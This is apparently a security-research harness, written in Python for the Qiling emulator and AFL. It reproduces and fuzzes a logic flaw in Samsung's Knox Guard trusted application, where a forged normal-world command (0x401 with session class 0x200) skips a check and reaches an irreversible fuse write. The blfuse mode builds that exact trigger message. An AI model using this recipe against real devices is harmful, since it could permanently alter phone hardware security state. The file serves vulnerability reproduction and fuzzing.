from .params import *
from qiling import Qiling
import struct, os

# === tz_kg S7 reproduction + cmd-parser fuzz harness ========================
# Target: Samsung S24 Ultra (SM-S928B) Knox Guard QTEE TA, tz_kg.ta (report S7).
#
# Staging (see tz_kg.json): GP lifecycle stubbed (returns TEE_SUCCESS); Invoke-
# Command points DIRECTLY at the real dispatcher
#   TA_KG_cmd@0x318  (ABI: x0=req, w1=req_len, x2=resp, w3=resp_len)
# i.e. the function the GP plumbing (CElfFile_invoke -> GPAppLib_handleRequest)
# calls. Driving the dispatcher (not a leaf) exercises the WHOLE S7 logic chain:
#
#   0x40c  bl TEE_MemMove(&dword_13AD0C, req, 0x4418)   ; raw copy of NWd TCI
#   0x414  bl qsee_is_ns_range(req, req_len)            ; NS gate (tbz w0,#0)
#   0x43c  bl qsee_is_ns_range(resp, resp_len)          ; NS gate
#   0x570  ldr w21,[&dword_13AD0C]      ; cmd_id   = tci[0]
#   0x588  ldr w8, [&dword_13AD0C + 4]  ; session_class = tci[4]   (== dword_13AD10)
#   0x58c  cmp w8, #0x200
#   0x5a8  bl process_blcmd@0xea1c  (cmd_id, &tci, &resp)   ; PROCA SKIPPED
#            -> cmd_id 0x401 -> KGBL_write_fuse@0xa894
#               -> kg_write_fuse_bit@0x3d08 -> qsee_fuse_write(0x221C1358, state)
#   else   -> PROCA (kg_PaTzHandler*) -> process_cmd@0xeb7c
#
# TCI layout (kg_tci_message_t, 0x4418=17432 bytes):
#   +0x00 cmd_id        (u32, LE)
#   +0x04 session_class (u32, LE)   == 0x200 selects the bootloader path
#   +0x08 status        (u64)
#   +0x10 payload[...]  ; KGBL_write_fuse reads state = LE u32 at payload[0] (tci+0x10)
#
# S7 DEMONSTRATION (default / KG_MODE=blfuse): set tci[0]=0x401 (KGBL_write_fuse),
# tci[4]=0x200 (bootloader gate), tci[0x10]=state(1 or 2). This drives the
# NWd-forgeable bootloader gate to the IRREVERSIBLE fuse blow. The emulator's
# qsee_fuse_write stub logs "*** OEM SPARE_1 FUSE BLOW *** addr=0x221c1358" —
# the dynamic confirmation that an NWd request reached the fuse write with PROCA
# skipped. (S7 is a LOGIC bug, not memory-corruption: there is no asan crash on
# this path; the proof is the logged fuse write + the clean lifecycle.)
#
# FUZZ MODE (no KG_MODE env): AFL drives the FIRST 8 bytes of the TCI
# (cmd_id + session_class) plus the payload head, so it explores both the
# bootloader and the NWd-PROCA command surfaces and any length/offset field a
# handler reads out of the copied TCI. The full 0x4418 TCI is attacker-mapped so
# a parser that reads off the end faults (asan/guard) -> crash.

AFL_EXIT  = 0x13370
TCI_LEN   = 0x4418          # 17432 — the exact size the dispatcher demands (>=)
RESP_LEN  = 0x4420          # resp must be >= 0x4418+? ; give a generous mapped resp

REQ_BASE  = 0x51000000
REQ_SIZE  = 0x6000          # > TCI_LEN, page-aligned
RESP_BASE = 0x52000000
RESP_SIZE = 0x6000

CMD_WRITE_FUSE   = 0x401    # KGBL_write_fuse
SESSION_CLASS_BL = 0x200    # bootloader gate
FUSE_STATE       = int(os.environ.get("KG_FUSE_STATE", "1"), 0) & 0xFFFFFFFF

MODE = os.environ.get("KG_MODE", "")   # "blfuse" forces the S7 demonstration


def init_fuzz(emu, sid):
    ql = emu.ql
    for base, size, name in ((REQ_BASE, REQ_SIZE, "req"), (RESP_BASE, RESP_SIZE, "resp")):
        try:
            ql.mem.map(base, size, info=f"[tz_kg] {name}")
        except Exception as e:
            ql.log.warning(f"[tz_kg] map {name} @ {hex(base)}: {e}")
    print(f"[tz_kg] init: req@{hex(REQ_BASE)} resp@{hex(RESP_BASE)} mode={MODE or 'fuzz'}")


def _build_tci(cmd_id, session_class, payload_head=b""):
    buf = bytearray(TCI_LEN)
    struct.pack_into("<I", buf, 0x00, cmd_id & 0xFFFFFFFF)
    struct.pack_into("<I", buf, 0x04, session_class & 0xFFFFFFFF)
    if payload_head:
        n = min(len(payload_head), TCI_LEN - 0x10)
        buf[0x10:0x10 + n] = payload_head[:n]
    return bytes(buf)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    if MODE == "blfuse":
        # Deterministic S7 fuse-blow path.
        cmd_id, scls = CMD_WRITE_FUSE, SESSION_CLASS_BL
        payload = struct.pack("<I", FUSE_STATE)        # state at tci+0x10
        print(f"[tz_kg] S7 blfuse: cmd_id={cmd_id:#x} session_class={scls:#x} "
              f"state={FUSE_STATE} -> expect qsee_fuse_write(0x221C1358,{FUSE_STATE})")
    else:
        # Fuzz: cmd_id = input[0:4], session_class = input[4:8], payload head = input[8:].
        cmd_id = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 1
        scls   = struct.unpack_from("<I", input, 4)[0] if len(input) >= 8 else 0
        payload = input[8:8 + 0x800]

    tci = _build_tci(cmd_id, scls, payload)
    ql.mem.write(REQ_BASE, tci + b"\x00" * (REQ_SIZE - len(tci)))
    ql.mem.write(RESP_BASE, b"\x00" * RESP_SIZE)

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # TA_KG_cmd(x0=req, w1=req_len, x2=resp, w3=resp_len)
    ql.arch.regs.x0 = REQ_BASE
    ql.arch.regs.x1 = TCI_LEN
    ql.arch.regs.x2 = RESP_BASE
    ql.arch.regs.x3 = RESP_LEN
    ql.arch.regs.x30 = AFL_EXIT
    return True
